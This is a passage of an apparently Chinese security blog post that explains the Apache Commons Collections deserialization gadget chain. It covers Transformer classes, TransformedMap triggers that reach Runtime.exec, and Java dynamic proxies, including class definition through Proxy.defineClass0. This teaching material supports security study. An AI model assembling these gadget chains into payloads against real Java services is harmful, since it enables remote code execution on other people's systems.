class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="关键类"><a href="#关键类" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer<br>ConstantTransformer<br>InvokerTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><p>作用很简单，往这个类的构造函数传入一个 Object，然后重写的 transform 会返回这个 Object，后面说到的<code>TransformerMap.decorate(Map,Transformer,Transformer).put(&quot;a&quot;,&quot;b&quot;)</code>返回的就不是字符”a b”而是<code>Runtime.getRuntime()</code></p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>跟进源码也很容易理解，往构造函数传入方法名，参数类型，参数列表，重写的 transform 反射进行了命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>()&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote><p>导入的是<code>org.apache.commons.collections.Transformer</code>，而不是<code>javax.xml.transform.Transformer;</code></p></blockquote><p><code>Transformer</code>是一个接口，只有一个方法<code>public Object transform(Object input);</code></p><p>通过<code>Transformer</code>数组存储了<code>ConstantTransformer、InvokerTransformer</code>实例对象，<code>ConstantTransformer、InvokerTransformer</code>均实现了可序列化接口，并且都重写了<code>transform</code>这个方法</p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>也实现了<code>Transformer</code>接口，可以将多个<code>Transformer</code>对象串在一起，<code>ChainedTransformer</code>构造函数接受的是<code>Transformer</code>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure><p>贴一下 p 牛的图</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png"></p><h4 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>&#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br></code></pre></td></tr></table></figure><p>可见这个类用于修饰 Map，修饰过的 Map 在添加新元素的时候可以执行一个回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<span class="hljs-comment">//decorate调用了构造函数，赋值valueTransformer，keyTransformer</span><br><br><span class="hljs-comment">//1.TransformedMap.decorate.put触发</span><br>decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//随便添加新元素触发传入的，上面是keyTransformer为null，那么将是调用valueTransformer.transform方法(put(&quot;a&quot;,&quot;b&quot;)，transformKey和transformValue都会去调用，因此填入decorate方法的参数顺序不影响最终的结果)，即此时触发TransformedMap.transform，进而调用chainedTransformer.transform，最后Transformer数组元素一个个调用transform方法，成功RCE</span><br><br><span class="hljs-comment">//2.修改value触发</span><br>hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//必须要先存入随意的键值对，下面两行代码修改这个键值对的值触发</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>就像研究反序列化一样，我们可以自定义<code>writeObject</code>，写入我们想要写入的；动态代理通过 Java 的反射机制，劫持到所持有的委托类对象的相关方法，成为特定的服务；这样做一是隔绝了直接调用相关业务类的方法或者比静态代理(代码写死)更加灵活，通过代理类来调用一些方法；也可以自定义一些方法在其中（面向切面编程：切入点前执行 aaa，切入点后执行 bbb），这样可以完成对程序的无侵入式扩展</p><p><strong>Java 动态代理主要使用场景：</strong></p><ol><li>统计方法执行所耗时间</li><li>在方法执行前后添加日志</li><li>检测方法的参数或返回值</li><li>方法访问权限控制</li><li>方法<code>Mock</code>测试</li></ol><h6 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h6><p>生成动态代理类，创建代理类实例，实现了<code>Serializable</code>接口</p><p>主要方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h6><p>用于调用<code>java.lang.reflect.Proxy</code>生成的代理类方法，接口中只定义了一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span><br><span class="hljs-comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  在其上调用方法的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span><br><span class="hljs-comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span><br><span class="hljs-comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span><br><span class="hljs-comment">     *               或 java.lang.Boolean）的实例中。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span><br><span class="hljs-comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span><br><span class="hljs-comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span><br><span class="hljs-comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span><br><span class="hljs-comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span><br><span class="hljs-comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span><br><span class="hljs-comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span><br><span class="hljs-comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="使用-java-lang-reflect-Proxy-动态创建类对象"><a href="#使用-java-lang-reflect-Proxy-动态创建类对象" class="headerlink" title="使用 java.lang.reflect.Proxy 动态创建类对象"></a>使用 java.lang.reflect.Proxy 动态创建类对象</h5><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p><ol><li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li><li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li><li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li><li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li><li>该类实现了代理接口类(示例中的接口类是<code>com.anbai.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li><li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li><li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li><li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li><li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li></ol><h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 